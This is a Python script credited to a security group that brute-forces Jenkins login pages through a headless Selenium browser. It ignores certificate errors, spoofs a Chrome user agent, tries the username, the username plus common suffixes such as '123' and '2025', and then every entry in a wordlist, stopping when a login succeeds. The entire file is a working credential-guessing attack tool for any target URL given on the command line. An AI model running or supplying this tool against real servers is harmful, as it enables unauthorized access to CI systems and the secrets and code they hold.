#!/usr/bin/env python3
'''
jenkins password brute forcer
code by : wisdom (Antonius)
https://www.bluedragonsec.com
https://github.com/bluedragonsecurity
'''
import sys,time, os
from selenium import webdriver
from selenium.webdriver.chrome.service import Service as ChromeService
from webdriver_manager.chrome import ChromeDriverManager
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC

def init_browser():
    try:
        options = Options()
        options.add_argument('--ignore-certificate-errors')
        options.add_argument('--ignore-ssl-errors')
        options.add_argument("--headless=new")
        options.add_argument("--no-sandbox")
        options.add_argument("--disable-dev-shm-usage")
        options.add_argument("--disable-gpu")
        user_agent = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36"
        options.add_argument(f'--user-agent={user_agent}')
        driver = webdriver.Chrome(service=ChromeService(ChromeDriverManager().install()), options=options)
        return driver
    except Exception as e:
        raise e

def validate_user_login(driver, target_url, username, password):
    url_sekarang = driver.current_url
    #and "loginError" not in url_sekarang
    if "Invalid username or password" not in driver.page_source and "loginError" not in url_sekarang:
        if "security_check" in url_sekarang or "Not Found" in driver.page_source or "security_check" in driver.page_source:
            driver.get(target_url)
            wait = WebDriverWait(driver, 5)
            time.sleep(6)
        elif "j_username" in driver.page_source and "j_password" in driver.page_source:
            time.sleep(0.1)
        else:
            #print(driver.page_source)
            print("[+] w00t ! successfully login using username : "+username+"  password : " + password)
            sys.exit()
    return driver

def login(driver,username, password, target_url):
    print("[+] trying to login using password : " + password)
    wait = WebDriverWait(driver, 8)
    time.sleep(8)
    try:
        username_field = driver.find_element(By.ID, "j_username")
    except:
        try:
            username_field = wait.until(EC.visibility_of_element_located((By.NAME, "j_username")))
        except Exception as e:
            #print(driver.page_source)
            raise e
        pass
    username_field.clear()
    username_field.send_keys(username)
    try:
        password_field = driver.find_element(By.ID, "j_password")
    except:
        try:
            password_field = wait.until(EC.visibility_of_element_located((By.NAME, "j_password")))
        except Exception as e:
            raise e
        pass
    password_field.clear()
    password_field.send_keys(password)
    try:
        button = wait.until(EC.element_to_be_clickable((By.NAME, "Submit")))
    except:
        button = driver.find_element(By.NAME, "Submit")
    button.click()
    time.sleep(6)
    driver = validate_user_login(driver, target_url, username, password)
    return driver


varian_sandi = ["123", "12345", "2025", "2026", "@123", "@*123", "#123"]
if len(sys.argv) < 4:
    print("[+] usage : " + sys.argv[0] + " <target_jenkins_login_url> <wordlist_path> <username>")
    sys.exit()
else:
    wordlist = sys.argv[2]
    target_url = sys.argv[1]
    username = sys.argv[3]
    if "http" not in target_url:
        target_url = "https://" + target_url
    if "/login" not in target_url:
        target_url += "/login" 
    print("[+] bruteforcing " +  target_url)
    print("[+] wordlist : " + wordlist)
    print("[+] username : " + username)
    driver = init_browser()
    driver.get(target_url)
    driver = login(driver,username, username, target_url)
    for sandi in varian_sandi:
        password = username + sandi
        driver = login(driver,username, password, target_url)
    with open(wordlist, 'r') as file:
        for line in file:
            password = line.strip()
            driver = login(driver,username, password, target_url)
            
            
